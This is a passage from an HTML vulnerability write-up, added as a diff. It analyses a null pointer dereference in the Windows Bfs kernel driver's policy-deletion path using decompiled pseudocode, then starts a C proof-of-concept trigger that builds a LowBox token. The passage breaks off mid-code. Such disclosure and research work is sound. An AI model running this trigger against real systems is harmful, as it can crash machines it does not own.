+<span id="cb14-13"><a href="#cb14-13" aria-hidden="true" tabindex="-1"></a>    v1 <span class="op">=</span> SeQueryInformationToken<span class="op">(</span>Token<span class="op">,</span> TokenUser<span class="op">,</span> <span class="op">&amp;</span>TokenInformation<span class="op">);</span></span>
+<span id="cb14-14"><a href="#cb14-14" aria-hidden="true" tabindex="-1"></a>    v5 <span class="op">=</span> v1<span class="op">;</span></span>
+<span id="cb14-15"><a href="#cb14-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>v1 <span class="op">&lt;</span> <span class="dv">0</span> <span class="op">||</span></span>
+<span id="cb14-16"><a href="#cb14-16" aria-hidden="true" tabindex="-1"></a>        <span class="op">(</span>v1 <span class="op">=</span> SeQueryInformationToken<span class="op">(</span>Token<span class="op">,</span> TokenAppContainerSid<span class="op">,</span> <span class="op">&amp;</span>P<span class="op">),</span> v5 <span class="op">=</span> v1<span class="op">,</span> v1 <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">||</span></span>
+<span id="cb14-17"><a href="#cb14-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">(</span>v1 <span class="op">=</span> BfsRemovePolicyEntry<span class="op">(</span>gBfsFilterHandle<span class="op">,</span> <span class="op">*</span>reinterpret_cast<span class="op">&lt;</span>PSID<span class="op">*&gt;(&amp;</span>P<span class="op">)),</span> v5 <span class="op">=</span> v1<span class="op">,</span> v1 <span class="op">&lt;</span> <span class="dv">0</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb14-18"><a href="#cb14-18" aria-hidden="true" tabindex="-1"></a>        <span class="co">// ... snip ...</span></span>
+<span id="cb14-19"><a href="#cb14-19" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb14-20"><a href="#cb14-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb14-21"><a href="#cb14-21" aria-hidden="true" tabindex="-1"></a>LABEL_11<span class="op">:</span></span>
+<span id="cb14-22"><a href="#cb14-22" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ... snip ...</span></span>
+<span id="cb14-23"><a href="#cb14-23" aria-hidden="true" tabindex="-1"></a>    <span class="co">// cleanup </span></span>
+<span id="cb14-24"><a href="#cb14-24" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> v5<span class="op">;</span></span>
+<span id="cb14-25"><a href="#cb14-25" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsProcessDeletePolicyEntryRequest</code> PseduoCode</strong></p>
+<p><code>BfsProcessDeletePolicyEntryRequest</code> will first fetch the <code>ACCESS_TOKEN</code> object from the user supplied input handle (1). The function then confirms the user supplied token is an <code>AppSilo</code> token (2). And finally the function will call <code>BfsRemovePolicyEntry</code>. The Pseduocode for <code>BfsRemovePolicyEntry</code> can be seen below:</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsRemovePolicyEntry<span class="op">(...</span> args <span class="op">...)</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 1. Fetch PolicyEntry from hash table</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    PolicyEntry<span class="op">*</span> PolicyEntry <span class="op">=</span> BfsLookupPolicyEntryHashTable<span class="op">(</span>PolicyTable<span class="op">-&gt;</span>HashTable<span class="op">,</span> HASH<span class="op">,</span> UserSid<span class="op">,</span> AppContainerSid<span class="op">);</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    PolicyEntry<span class="op">*</span> PolicyEntryBak <span class="op">=</span> PolicyEntry<span class="op">;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 2. If policy exists, remove from hash table and remove other policies from global table</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>PolicyEntry<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        BfsRemoveEntryHashTable<span class="op">(</span>PolicyTable<span class="op">-&gt;</span>HashTable<span class="op">,</span> <span class="op">&amp;</span>PolicyEntry<span class="op">-&gt;</span>HashEntry<span class="op">);</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>Feature_Servicing_BfsGAFeature__private_IsEnabledDeviceUsageNoInline<span class="op">())</span> <span class="op">{</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>            BfsRemoveAllPoliciesFromGlobalFileTable<span class="op">(&amp;</span>gBfsGlobalFileTable<span class="op">,</span> PolicyEntryBak<span class="op">);</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        BfsDereferencePolicyEntry<span class="op">(</span>PolicyEntryBak<span class="op">);</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>   <span class="co">// ... snip ...</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>   <span class="co">// irreleveant logic / cleanup </span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> v18<span class="op">;</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong><code>BfsRemovePolicyEntry</code> Psuedocode</strong></p>
+<p><code>BfsRemovePolicyEntry</code> is responsible for fetching the <code>PolicyEntry</code> in the hash table (1). Then removing the <code>PolicyEntry</code> from the entry from the hash table performing other cleanup duties (2). One of the cleanup duties involves a call to <code>BfsRemoveAllPoliciesFromGlobalFileTable</code>.The first operations performed by <code>BfsRemoveAllPoliciesFromGlobalFileTable</code> is calling <code>BfsEnumeratePolicy</code> and passing <code>PolicyEntry</code> as the first argument. The beginning logic of <code>BfsEnumeratePolicy</code> fetches the storage object pointer from the <code>PolicyEntry</code> and acquires a shared lock on the object by calling <code>ExAcquirePushLockSharedEx</code> as shown below:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>__int64 __fastcall BfsEnumeratePolicy<span class="op">(</span>PolicyEntry <span class="op">*</span>PolEntry<span class="op">,</span> __int64 a2<span class="op">,</span> _DWORD <span class="op">*</span>a3<span class="op">,</span> <span class="dt">int</span> <span class="op">*</span>r9_0<span class="op">)</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="op">{</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a> <span class="co">// ... snip ...</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  StorObject <span class="op">=</span> PolEntry<span class="op">-&gt;</span>StorObject<span class="op">;</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  v35 <span class="op">=</span> <span class="op">&amp;</span>v34<span class="op">;</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>  v34 <span class="op">=</span> <span class="op">&amp;</span>v34<span class="op">;</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>  KeEnterCriticalRegion<span class="op">();</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>  ExAcquirePushLockSharedEx<span class="op">(</span>StorObject<span class="op">,</span> <span class="dv">0</span><span class="bu">LL</span><span class="op">);</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>  p_UnkTable <span class="op">=</span> <span class="op">&amp;</span>PolEntry<span class="op">-&gt;</span>StorObject<span class="op">-&gt;</span>UnkTable<span class="op">;</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a><span class="co">// ... snip ...</span></span></code></pre></div>
+<p><strong><code>BfsEnumeratePolicy</code> Pseduocode</strong></p>
+<p>Finally, the null pointer derference is triggered when calling <code>ExAcquirePushLockSharedEx</code>. This issue occurs for 2 major reasons:</p>
+<ul>
+<li>When the policy was created a storage object was not created to
+accompany it</li>
+<li>When allocating the <code>PolicyEntry</code> object, the function
+<code>ExAllocatePool2</code> to allocate the object
+<ul>
+<li><code>ExAllocatePool2</code> by default initializes the memory when
+allocating an object</li>
+</ul></li>
+</ul>
+<h4
+id="bfsenumeratepolicy-null-pointer-derference-trigger"><code>BfsEnumeratePolicy</code> Null Pointer Derference Trigger</h4>
+<div class="sourceCode" id="cb17"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;Windows.h&gt;</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;userenv.h&gt;</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;sddl.h&gt;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;winternl.h&gt;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#pragma comment(lib, &quot;userenv.lib&quot;)</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#pragma comment(lib, &quot;ntdll.lib&quot;)</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> NTSTATUS<span class="op">(</span>NTAPI<span class="op">*</span> PNtCreateLowBoxToken<span class="op">)(</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>    PHANDLE TokenHandle<span class="op">,</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>    HANDLE ExistingTokenHandle<span class="op">,</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>    ACCESS_MASK DesiredAccess<span class="op">,</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a>    POBJECT_ATTRIBUTES ObjectAttributes<span class="op">,</span></span>
+<span id="cb17-16"><a href="#cb17-16" aria-hidden="true" tabindex="-1"></a>    PSID PackageSid<span class="op">,</span></span>
+<span id="cb17-17"><a href="#cb17-17" aria-hidden="true" tabindex="-1"></a>    ULONG CapabilityCount<span class="op">,</span></span>
+<span id="cb17-18"><a href="#cb17-18" aria-hidden="true" tabindex="-1"></a>    PSID_AND_ATTRIBUTES Capabilities<span class="op">,</span></span>
+<span id="cb17-19"><a href="#cb17-19" aria-hidden="true" tabindex="-1"></a>    ULONG HandleCount<span class="op">,</span></span>
+<span id="cb17-20"><a href="#cb17-20" aria-hidden="true" tabindex="-1"></a>    HANDLE<span class="op">*</span> Handles</span>
+<span id="cb17-21"><a href="#cb17-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb17-22"><a href="#cb17-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-23"><a href="#cb17-23" aria-hidden="true" tabindex="-1"></a>BOOL Debug <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb17-24"><a href="#cb17-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-25"><a href="#cb17-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-26"><a href="#cb17-26" aria-hidden="true" tabindex="-1"></a>HANDLE tLowbox<span class="op">;</span></span>
+<span id="cb17-27"><a href="#cb17-27" aria-hidden="true" tabindex="-1"></a>HANDLE hDevice<span class="op">;</span></span>
+<span id="cb17-28"><a href="#cb17-28" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-29"><a href="#cb17-29" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-30"><a href="#cb17-30" aria-hidden="true" tabindex="-1"></a><span class="kw">typedef</span> <span class="kw">struct</span> _DeletePolicyRequest <span class="op">{</span></span>
+<span id="cb17-31"><a href="#cb17-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-32"><a href="#cb17-32" aria-hidden="true" tabindex="-1"></a>    HANDLE hToken<span class="op">;</span></span>
+<span id="cb17-33"><a href="#cb17-33" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-34"><a href="#cb17-34" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> DeletePolicyRequest<span class="op">,</span> <span class="op">*</span> PDeletePolicyRequest<span class="op">;</span></span>
+<span id="cb17-35"><a href="#cb17-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-36"><a href="#cb17-36" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-37"><a href="#cb17-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-38"><a href="#cb17-38" aria-hidden="true" tabindex="-1"></a>HANDLE GenerateLowBoxToken<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb17-39"><a href="#cb17-39" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-40"><a href="#cb17-40" aria-hidden="true" tabindex="-1"></a>    HMODULE hNtdll <span class="op">=</span> GetModuleHandleW<span class="op">(</span><span class="st">L&quot;ntdll.dll&quot;</span><span class="op">);</span></span>
+<span id="cb17-41"><a href="#cb17-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>hNtdll<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-42"><a href="#cb17-42" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;Failed to get ntdll.dll handle</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-43"><a href="#cb17-43" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-44"><a href="#cb17-44" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-45"><a href="#cb17-45" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-46"><a href="#cb17-46" aria-hidden="true" tabindex="-1"></a>    PNtCreateLowBoxToken pNtCreateLowBoxToken <span class="op">=</span> <span class="op">(</span>PNtCreateLowBoxToken<span class="op">)</span>GetProcAddress<span class="op">(</span>hNtdll<span class="op">,</span> <span class="st">&quot;NtCreateLowBoxToken&quot;</span><span class="op">);</span></span>
+<span id="cb17-47"><a href="#cb17-47" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-48"><a href="#cb17-48" aria-hidden="true" tabindex="-1"></a>    <span class="co">// Resolve App Container Sid for Widgets Container</span></span>
+<span id="cb17-49"><a href="#cb17-49" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> <span class="dt">wchar_t</span><span class="op">*</span> containerName <span class="op">=</span> <span class="st">L&quot;MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy&quot;</span><span class="op">;</span></span>
+<span id="cb17-50"><a href="#cb17-50" aria-hidden="true" tabindex="-1"></a>    PSID appContainerSid <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb17-51"><a href="#cb17-51" aria-hidden="true" tabindex="-1"></a>    HRESULT hr <span class="op">=</span> DeriveAppContainerSidFromAppContainerName<span class="op">(</span>containerName<span class="op">,</span> <span class="op">&amp;</span>appContainerSid<span class="op">);</span></span>
+<span id="cb17-52"><a href="#cb17-52" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>FAILED<span class="op">(</span>hr<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-53"><a href="#cb17-53" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;DeriveAppContainerSid failed. HR(</span><span class="sc">%x</span><span class="st">)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> hr<span class="op">);</span></span>
+<span id="cb17-54"><a href="#cb17-54" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-55"><a href="#cb17-55" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-56"><a href="#cb17-56" aria-hidden="true" tabindex="-1"></a>    <span class="dt">wchar_t</span><span class="op">*</span> wsAppContainerSid<span class="op">;</span></span>
+<span id="cb17-57"><a href="#cb17-57" aria-hidden="true" tabindex="-1"></a>    ConvertSidToStringSidW<span class="op">(</span>appContainerSid<span class="op">,</span> <span class="op">&amp;</span>wsAppContainerSid<span class="op">);</span></span>
+<span id="cb17-58"><a href="#cb17-58" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>Debug<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-59"><a href="#cb17-59" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;AppContainerSid: %ws</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> wsAppContainerSid<span class="op">);</span></span>
+<span id="cb17-60"><a href="#cb17-60" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-61"><a href="#cb17-61" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-62"><a href="#cb17-62" aria-hidden="true" tabindex="-1"></a>    <span class="co">// privateNetworkClientServer capability (`S-1-15-3-65536`)</span></span>
+<span id="cb17-63"><a href="#cb17-63" aria-hidden="true" tabindex="-1"></a>    <span class="dt">const</span> DWORD capCt <span class="op">=</span> <span class="dv">3</span><span class="op">;</span></span>
+<span id="cb17-64"><a href="#cb17-64" aria-hidden="true" tabindex="-1"></a>    SID_AND_ATTRIBUTES caps<span class="op">[</span>capCt<span class="op">]</span> <span class="op">=</span> <span class="op">{};</span></span>
+<span id="cb17-65"><a href="#cb17-65" aria-hidden="true" tabindex="-1"></a>    PSID capSid <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb17-66"><a href="#cb17-66" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ConvertStringSidToSidW<span class="op">(</span><span class="st">L&quot;S-1-15-3-65536&quot;</span><span class="op">,</span> <span class="op">&amp;</span>capSid<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-67"><a href="#cb17-67" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;ConvertStringSidToSid failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-68"><a href="#cb17-68" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-69"><a href="#cb17-69" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-70"><a href="#cb17-70" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">0</span><span class="op">].</span>Sid <span class="op">=</span> capSid<span class="op">;</span></span>
+<span id="cb17-71"><a href="#cb17-71" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">0</span><span class="op">].</span>Attributes <span class="op">=</span> SE_GROUP_ENABLED<span class="op">;</span></span>
+<span id="cb17-72"><a href="#cb17-72" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-73"><a href="#cb17-73" aria-hidden="true" tabindex="-1"></a>    <span class="co">// runFullTrust capability</span></span>
+<span id="cb17-74"><a href="#cb17-74" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ConvertStringSidToSidW<span class="op">(</span><span class="st">L&quot;S-1-15-3-1024&quot;</span><span class="op">,</span> <span class="op">&amp;</span>capSid<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-75"><a href="#cb17-75" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;ConvertStringSidToSid failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-76"><a href="#cb17-76" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-77"><a href="#cb17-77" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-78"><a href="#cb17-78" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">1</span><span class="op">].</span>Sid <span class="op">=</span> capSid<span class="op">;</span></span>
+<span id="cb17-79"><a href="#cb17-79" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">1</span><span class="op">].</span>Attributes <span class="op">=</span> SE_GROUP_ENABLED<span class="op">;</span></span>
+<span id="cb17-80"><a href="#cb17-80" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-81"><a href="#cb17-81" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-82"><a href="#cb17-82" aria-hidden="true" tabindex="-1"></a>    <span class="co">// runFullTrust capability</span></span>
+<span id="cb17-83"><a href="#cb17-83" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>ConvertStringSidToSidW<span class="op">(</span><span class="st">L&quot;S-1-15-3-1030&quot;</span><span class="op">,</span> <span class="op">&amp;</span>capSid<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-84"><a href="#cb17-84" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;ConvertStringSidToSid failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-85"><a href="#cb17-85" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-86"><a href="#cb17-86" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-87"><a href="#cb17-87" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">2</span><span class="op">].</span>Sid <span class="op">=</span> capSid<span class="op">;</span></span>
+<span id="cb17-88"><a href="#cb17-88" aria-hidden="true" tabindex="-1"></a>    caps<span class="op">[</span><span class="dv">2</span><span class="op">].</span>Attributes <span class="op">=</span> SE_GROUP_ENABLED<span class="op">;</span></span>
+<span id="cb17-89"><a href="#cb17-89" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-90"><a href="#cb17-90" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 3. Capture the current process token</span></span>
+<span id="cb17-91"><a href="#cb17-91" aria-hidden="true" tabindex="-1"></a>    HANDLE existingToken <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb17-92"><a href="#cb17-92" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(!</span>OpenProcessToken<span class="op">(</span>GetCurrentProcess<span class="op">(),</span> TOKEN_ALL_ACCESS<span class="op">,</span> <span class="op">&amp;</span>existingToken<span class="op">))</span> <span class="op">{</span></span>
+<span id="cb17-93"><a href="#cb17-93" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;OpenProcessToken failed.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-94"><a href="#cb17-94" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-95"><a href="#cb17-95" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-96"><a href="#cb17-96" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-97"><a href="#cb17-97" aria-hidden="true" tabindex="-1"></a>    OBJECT_ATTRIBUTES oa <span class="op">=</span> <span class="op">{};</span></span>
+<span id="cb17-98"><a href="#cb17-98" aria-hidden="true" tabindex="-1"></a>    InitializeObjectAttributes<span class="op">(&amp;</span>oa<span class="op">,</span> <span class="kw">nullptr</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">,</span> <span class="kw">nullptr</span><span class="op">);</span></span>
+<span id="cb17-99"><a href="#cb17-99" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-100"><a href="#cb17-100" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 4. Use `NtCreateLowBoxToken` to generate a `LowBoxToken` based on the current process token with `privateNetworkClientServer` capability</span></span>
+<span id="cb17-101"><a href="#cb17-101" aria-hidden="true" tabindex="-1"></a>    HANDLE lowboxToken <span class="op">=</span> <span class="kw">nullptr</span><span class="op">;</span></span>
+<span id="cb17-102"><a href="#cb17-102" aria-hidden="true" tabindex="-1"></a>    NTSTATUS status <span class="op">=</span> pNtCreateLowBoxToken<span class="op">(</span></span>
+<span id="cb17-103"><a href="#cb17-103" aria-hidden="true" tabindex="-1"></a>        <span class="op">&amp;</span>lowboxToken<span class="op">,</span></span>
+<span id="cb17-104"><a href="#cb17-104" aria-hidden="true" tabindex="-1"></a>        existingToken<span class="op">,</span></span>
+<span id="cb17-105"><a href="#cb17-105" aria-hidden="true" tabindex="-1"></a>        TOKEN_ALL_ACCESS<span class="op">,</span></span>
+<span id="cb17-106"><a href="#cb17-106" aria-hidden="true" tabindex="-1"></a>        <span class="op">&amp;</span>oa<span class="op">,</span></span>
+<span id="cb17-107"><a href="#cb17-107" aria-hidden="true" tabindex="-1"></a>        appContainerSid<span class="op">,</span></span>
+<span id="cb17-108"><a href="#cb17-108" aria-hidden="true" tabindex="-1"></a>        capCt<span class="op">,</span></span>
+<span id="cb17-109"><a href="#cb17-109" aria-hidden="true" tabindex="-1"></a>        caps<span class="op">,</span></span>
+<span id="cb17-110"><a href="#cb17-110" aria-hidden="true" tabindex="-1"></a>        <span class="dv">0</span><span class="op">,</span></span>
+<span id="cb17-111"><a href="#cb17-111" aria-hidden="true" tabindex="-1"></a>        <span class="kw">nullptr</span></span>
+<span id="cb17-112"><a href="#cb17-112" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb17-113"><a href="#cb17-113" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-114"><a href="#cb17-114" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>status <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-115"><a href="#cb17-115" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;NtCreateLowBoxToken failed: 0x</span><span class="sc">%X\n</span><span class="st">&quot;</span><span class="op">,</span> status<span class="op">);</span></span>
+<span id="cb17-116"><a href="#cb17-116" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> INVALID_HANDLE_VALUE<span class="op">;</span></span>
+<span id="cb17-117"><a href="#cb17-117" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-118"><a href="#cb17-118" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-119"><a href="#cb17-119" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 5. Return Token </span></span>
+<span id="cb17-120"><a href="#cb17-120" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;Successfully Created Lowbox Token</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb17-121"><a href="#cb17-121" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> lowboxToken<span class="op">;</span></span>
+<span id="cb17-122"><a href="#cb17-122" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-123"><a href="#cb17-123" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb17-124"><a href="#cb17-124" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-125"><a href="#cb17-125" aria-hidden="true" tabindex="-1"></a><span class="kw">extern</span> <span class="st">&quot;C&quot;</span> NTSTATUS NTAPI NtOpenKey<span class="op">(</span></span>
+<span id="cb17-126"><a href="#cb17-126" aria-hidden="true" tabindex="-1"></a>    PHANDLE KeyHandle<span class="op">,</span></span>
+<span id="cb17-127"><a href="#cb17-127" aria-hidden="true" tabindex="-1"></a>    ACCESS_MASK DesiredAccess<span class="op">,</span></span>
